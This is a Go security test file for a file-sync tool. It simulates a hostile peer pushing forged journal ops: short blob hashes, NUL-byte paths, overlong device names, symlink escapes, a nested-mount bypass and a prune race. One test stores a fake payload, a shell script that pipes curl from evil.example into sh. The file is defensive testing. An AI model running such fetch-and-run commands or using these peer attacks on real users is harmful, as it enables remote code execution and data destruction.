package syncer

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/runbear-io/beardrive/internal/journal"
)

// Scoreboard row 15, round 4: the hostile peer, in depth.
//
// A teammate — or anyone who has compromised one of their devices — owns the
// bytes of their own journal and their own blobs, and every one of those bytes
// is input to the victim's Cycle. Round 3 audited the *fields* of an op
// (Path/Mode/Lamport). These tests attack the machinery around them: the pull
// loop, the conflict-copy namer, the ignore filter's lifetime inside one cycle,
// the --prune refusal, and what happens when one path simply cannot be written.
//
// Same pattern as sec_journal_test.go: a victim device over a shared file://
// remote, a hostile journal dropped into that remote by hand (no peer Session
// would author these), and explicit cycle() calls. Helpers here are prefixed
// secpeer*; secjrnBlob/secjrnPush/secjrnOp/secjrnProject and the package's own
// newDevice/sharedRemote/write/read/cycle/prune/hubState/exists are reused.

// secpeerCycle runs one cycle and returns the error instead of failing, so a
// test can assert on how the cycle degrades. Panics are converted into a
// failure with the stack site named, because a panic in Cycle is a crashed
// daemon on every teammate's machine.
func secpeerCycle(t *testing.T, s *Session) (res *Result, err error) {
	t.Helper()
	defer func() {
		if r := recover(); r != nil {
			t.Fatalf("Cycle panicked on peer-supplied input: %v", r)
		}
	}()
	return s.Cycle(context.Background())
}

// ---- the pull loop: a peer's Blob string is not a hash ----

// pull formats its "fetch blob" error with op.Blob[:12]. Op.Blob is arbitrary
// JSON off a peer's journal, not necessarily 64 hex characters, and the error
// path is reached for any blob the remote does not hold — which the attacker
// chooses freely, because a journal can name a blob that was never pushed.
//
// A blob string shorter than 12 bytes therefore slices out of range inside the
// victim's sync cycle. That is a crashed `bdrive` daemon on every device that
// shares the project, from one line of JSON, with no victim action.
//
// The secure behavior is the package's stated posture for a blob that is not
// there yet: skip it and retry next cycle, never break the cycle for the ops
// that ARE complete.
func TestSec_SyncPeer_ShortBlobStringCannotCrashTheCycle(t *testing.T) {
	be := sharedRemote(t)
	victim := newDevice(t, "victim", be)

	const content = "a well-formed op in the same journal"
	good := secjrnBlob(t, be, content)

	// Blob strings the attacker invents. None of them exists in the remote,
	// so every one takes pull's error path.
	short := secjrnOp(1, "a.md", "deadbeef", 8)                // 8 bytes: slices out of range
	tiny := secjrnOp(2, "b.md", "x", 1)                        // 1 byte
	empty64 := secjrnOp(3, "c.md", strings.Repeat("f", 64), 4) // well-formed, absent
	control := secjrnOp(4, "notes/ok.md", good, len(content))
	secjrnPush(t, be, "attacker", []journal.Op{short, tiny, empty64, control})

	res, err := secpeerCycle(t, victim)
	if err != nil {
		t.Fatalf("one absent blob killed the whole cycle: %v", err)
	}
	if got := read(t, victim.Folder, "notes/ok.md"); got != content {
		t.Fatalf("the complete op did not materialize: %q (res %+v)", got, res)
	}
}

// ---- materialize: one unwritable path must not wedge the device ----

// materialize propagates any write error straight out of Cycle, and Cycle
// returns before finish() — so the state cache is never saved either. A peer
// picks a path the victim's filesystem cannot hold and the victim's sync stops
// forever: every later cycle replays the same target, hits the same path, and
// dies at the same line. Nothing is pushed, nothing is pulled, and no command
// reports anything but the raw error.
//
// Neither trigger needs an exotic attacker. A path with a NUL byte is legal
// JSON and illegal on every filesystem; a file and, in a later push, a
// directory of the same name is just two ordinary ops, since a journal has no
// concept of a directory at all.
//
// The secure behavior is the invariant the package states for exactly this
// case: unreadable/unwritable paths are skipped and retried, never fatal.
func TestSec_SyncPeer_OneUnwritablePathCannotWedgeTheCycle(t *testing.T) {
	const content = "content that should still land"

	// Each case is a list of pushes; every push is followed by one cycle, so
	// the order the victim sees is fixed rather than map-iteration luck.
	cases := []struct {
		name   string
		pushes [][]string
	}{
		{"nul byte in path", [][]string{{"notes/bad\x00name.md"}}},
		{"a directory where a file already is", [][]string{{"docs"}, {"docs/child.md"}}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			be := sharedRemote(t)
			victim := newDevice(t, "victim", be)
			blob := secjrnBlob(t, be, content)

			var ops []journal.Op
			for _, push := range tc.pushes {
				for _, p := range push {
					ops = append(ops, secjrnOp(int64(len(ops)+1), p, blob, len(content)))
				}
				secjrnPush(t, be, "attacker", ops)
				if _, err := secpeerCycle(t, victim); err != nil {
					t.Fatalf("a peer's unwritable path stopped the cycle: %v", err)
				}
			}

			// The control op arrives in the same journal as the last push.
			ops = append(ops, secjrnOp(int64(len(ops)+1), "notes/ok.md", blob, len(content)))
			secjrnPush(t, be, "attacker", ops)
			if _, err := secpeerCycle(t, victim); err != nil {
				t.Fatalf("the device is wedged: %v", err)
			}
			if got := read(t, victim.Folder, "notes/ok.md"); got != content {
				t.Fatalf("the unrelated op did not materialize: %q", got)
			}
			// ...and a local edit still syncs.
			write(t, victim.Folder, "mine.md", "my own edit")
			res, err := secpeerCycle(t, victim)
			if err != nil {
				t.Fatalf("the device stayed wedged on the next cycle: %v", err)
			}
			if res.LocalOps == 0 {
				t.Fatal("a later local edit was never journaled — sync is stuck")
			}
		})
	}
}

// ---- conflict copies: the peer names the file ----

// conflictName builds a filename out of the LOSER's DeviceName, and the loser
// is often the peer. sanitize() replaces the characters that would traverse,
// but nothing bounds the length: DeviceName is an unvalidated string off a
// peer's journal, and a few hundred characters push the conflict copy's name
// past NAME_MAX.
//
// The write then fails, and because materialize's error is fatal to Cycle (see
// TestSec_SyncPeer_OneUnwritablePathCannotWedgeTheCycle) the op is already in
// the victim's own journal by then — so the victim replays it, fails, and never
// syncs again. The trigger is one concurrent edit to a shared file, which is
// the ordinary case conflict copies exist for.
func TestSec_SyncPeer_HostileDeviceNameCannotBreakTheConflictCopy(t *testing.T) {
	be := sharedRemote(t)
	victim := newDevice(t, "victim", be)

	// The victim syncs the project once first. A collision on a device's very
	// first cycle is a JOIN, which Cycle step 1b resolves in the project's
	// favour with no copy at all; the conflict copy this test is about is the
	// ordinary concurrent edit between two devices that already share a project.
	const warm = "already shared"
	warmOp := secjrnOp(1, "warm.md", secjrnBlob(t, be, warm), len(warm))
	secjrnPush(t, be, "attacker", []journal.Op{warmOp})
	if _, err := secpeerCycle(t, victim); err != nil {
		t.Fatal(err)
	}

	const theirs = "the peer's version"
	blob := secjrnBlob(t, be, theirs)
	op := secjrnOp(2, "shared.md", blob, len(theirs))
	op.Lamport = 2
	op.Time = time.Now().UTC().Add(-time.Hour) // loses last-writer-wins to the victim
	op.DeviceName = strings.Repeat("A", 300)   // lands verbatim in a filename
	secjrnPush(t, be, "attacker", []journal.Op{warmOp, op})

	// An ordinary concurrent edit, and exactly what makes a conflict copy.
	const mine = "the victim's version"
	write(t, victim.Folder, "shared.md", mine)

	res, err := secpeerCycle(t, victim)
	if err != nil {
		t.Fatalf("a peer's device name broke the cycle: %v", err)
	}
	if got := read(t, victim.Folder, "shared.md"); got != mine {
		t.Fatalf("the victim's own winning version was lost: %q", got)
	}
	if res.Conflicts == 0 {
		t.Fatal("control: no conflict copy was made at all, so the namer was never exercised")
	}
	// Whatever the copy is called, it must be a name the filesystem accepts —
	// i.e. it must actually be on disk.
	ents, err := os.ReadDir(victim.Folder)
	if err != nil {
		t.Fatal(err)
	}
	var found bool
	for _, e := range ents {
		if strings.Contains(e.Name(), ".bdrive-conflict-") {
			found = true
			if len(e.Name()) > 255 {
				t.Errorf("conflict copy name is %d bytes: %q", len(e.Name()), e.Name())
			}
		}
	}
	if !found {
		t.Error("the conflict copy was journaled but never written to disk")
	}
}

// ---- the ignore filter's lifetime inside one cycle ----

// A nested mount (a subdirectory with its own .bdrive/config.json) syncs
// through its OWN project. The parent must never write over it — that is a
// project boundary, and the two projects can have entirely different member
// lists. The protection is Filter.nested, which walkFolder populates during the
// scan at the top of the cycle.
//
// But when a pulled .bdriveignore lands, Cycle rebuilds the filter with
// loadFilter() — a fresh Filter with an EMPTY nested list — and hands that to
// materialize. .bdriveignore is an ordinary synced file any member may edit, so
// a peer who touches it in the same push drops the boundary and writes straight
// into the other project's working folder, where that project's own daemon
// picks the change up and pushes it on.
//
// The control below is the same attack without the .bdriveignore op, which is
// correctly refused. The delta is the finding.
func TestSec_SyncPeer_IgnoreFileReloadCannotDropTheNestedMountBoundary(t *testing.T) {
	const hostile = "planted by a peer of the OUTER project"
	const rules = "# rules from a peer\n*.log\n"

	// Returns whether the outer project's op landed inside the inner project's
	// working folder.
	run := func(t *testing.T, touchIgnore bool) bool {
		be := sharedRemote(t)
		victim := newDevice(t, "victim", be)
		// A second BearDrive project living inside this one, with its own
		// content — it syncs through its own project, not this one.
		secjrnProject(t, filepath.Join(victim.Folder, "sub"))
		write(t, victim.Folder, "sub/secret.md", "the inner project's own file")

		blob := secjrnBlob(t, be, hostile)
		ops := []journal.Op{secjrnOp(1, "sub/planted.md", blob, len(hostile))}
		if touchIgnore {
			ops = append(ops, secjrnOp(2, IgnoreFile, secjrnBlob(t, be, rules), len(rules)))
		}
		secjrnPush(t, be, "attacker", ops)

		cycle(t, victim)
		return exists(t, victim.Folder, "sub/planted.md")
	}

	if run(t, false) {
		t.Fatal("control: the nested mount was not protected even without the ignore-file op")
	}
	if run(t, true) {
		t.Errorf("a peer wrote sub/planted.md into a nested mount — a different project's working folder — by pushing %s in the same batch", IgnoreFile)
	}
}

// materialize resolves an op's path with filepath.Join and writes it with
// MkdirAll+CreateTemp+Rename — all of which follow symlinks. unsafeRel refuses
// a path that *spells* an escape, but "link/pwned.txt" spells nothing: the
// escape is on disk.
//
// The scan side does not have this asymmetry — walkFolder never descends
// through a symlink — so a symlinked directory in a mount is a one-way door: it
// receives peer writes and never reports them. The hub's upload path was fixed
// for exactly this shape in rounds 2 and 3; the device is a separate consumer.
func TestSec_SyncPeer_MaterializeCannotWriteThroughASymlink(t *testing.T) {
	be := sharedRemote(t)
	victim := newDevice(t, "victim", be)
	outside := t.TempDir() // stands in for ~/.ssh, a sibling checkout, anything

	// The victim's own mount contains a symlink to somewhere else — a build
	// output, a shared drive, "current" pointing at a release directory.
	if err := os.Symlink(outside, filepath.Join(victim.Folder, "link")); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}

	const content = "planted through a symlink"
	blob := secjrnBlob(t, be, content)
	ops := []journal.Op{
		secjrnOp(1, "link/pwned.txt", blob, len(content)),
		secjrnOp(2, "notes/ok.md", blob, len(content)), // control
	}
	secjrnPush(t, be, "attacker", ops)

	cycle(t, victim)

	if got := read(t, victim.Folder, "notes/ok.md"); got != content {
		t.Fatalf("control op did not materialize: %q", got)
	}
	if _, err := os.Stat(filepath.Join(outside, "pwned.txt")); err == nil {
		t.Errorf("a peer journal wrote %s — outside the mount root %s, through a symlink",
			filepath.Join(outside, "pwned.txt"), victim.Folder)
	}
}

// ---- sync --prune: the refusal and the rules must be the same rules ----

// `bdrive sync --prune` deletes from the hub, for the whole team, everything
// the shared rules exclude. cmd/bdrive's pruneSafe refuses to run it when the
// rules narrow scope with `!`, because then "everything excluded" is
// "everything but a few folders".
//
// That check reads .bdriveignore from disk BEFORE the cycle. pruneOps reads it
// again from disk in the middle of the cycle — after the pull has materialized
// whatever version a peer just pushed. The two reads are of different files.
//
// So a peer who narrows the project's scope (a documented, ordinary act:
// `bdrive scope`/`--only` writes exactly these rules) turns the next teammate's
// --prune into a hub-wide delete of everything outside that scope, with the
// refusal that exists to prevent it having already passed.
func TestSec_SyncPeer_PruneRefusalCannotBeRacedByAPushedIgnoreFile(t *testing.T) {
	be := sharedRemote(t)
	peer := newDevice(t, "peer", be)
	victim := newDevice(t, "victim", be)

	write(t, peer.Folder, "docs/a.md", "documentation")
	write(t, peer.Folder, "wiki/b.md", "wiki page")
	write(t, peer.Folder, IgnoreFile, "*.log\n") // no `!` rules: prune is allowed
	cycle(t, peer)
	cycle(t, victim)
	if !exists(t, victim.Folder, "docs/a.md") {
		t.Fatal("setup: the victim never received the project")
	}

	// The peer narrows the scope to wiki/ only — what `bdrive scope`/`--only`
	// writes — and pushes it.
	write(t, peer.Folder, IgnoreFile, "/*\n!/wiki/\n")
	cycle(t, peer)

	// The victim now runs `bdrive sync --prune`. This is the check the CLI
	// makes first, against the rules on the victim's disk right now.
	filter, err := LoadFilter(victim.Folder, nil)
	if err != nil {
		t.Fatal(err)
	}
	if filter.Negated() {
		t.Fatal("setup: the CLI would have refused before the cycle, so nothing is proven")
	}

	res := prune(t, victim)

	if res.Pruned != 0 {
		t.Errorf("--prune removed %d path(s) from the hub under `!` rules that arrived during the same cycle — the refusal was made against a different file", res.Pruned)
	}
	if _, ok := hubState(t, victim)["docs/a.md"]; !ok {
		t.Error("docs/a.md was deleted from the hub for the whole team by a prune the CLI had cleared")
	}
}

// ---- already refused: pin it ----

// The receiving device must verify that a blob's bytes hash to the sha the op
// asked for. Without it a peer serves arbitrary content for a hash the victim
// trusts — the same hole round 2 closed on the hub's ingest, on the other
// consumer. pull does check; this pins it, including that the substituted
// content never reaches the working folder.
func TestSec_SyncPeer_BlobContentMustHashToTheShaTheOpNames(t *testing.T) {
	be := sharedRemote(t)
	victim := newDevice(t, "victim", be)

	const honest = "what the sha actually names"
	const swapped = "#!/bin/sh\ncurl -s https://evil.example/x | sh\n"
	sum := sha256hex(honest)
	// The peer publishes the right key with the wrong bytes.
	if err := be.Put(context.Background(), "blobs/"+sum, strings.NewReader(swapped), int64(len(swapped))); err != nil {
		t.Fatal(err)
	}
	secjrnPush(t, be, "attacker", []journal.Op{secjrnOp(1, "run.sh", sum, len(honest))})

	if _, err := secpeerCycle(t, victim); err != nil {
		t.Fatalf("cycle failed outright: %v", err)
	}
	if b, err := os.ReadFile(filepath.Join(victim.Folder, "run.sh")); err == nil {
		if string(b) == swapped {
			t.Errorf("a peer served content that does not hash to the sha its op names, and it materialized: %q", b)
		}
	}
}
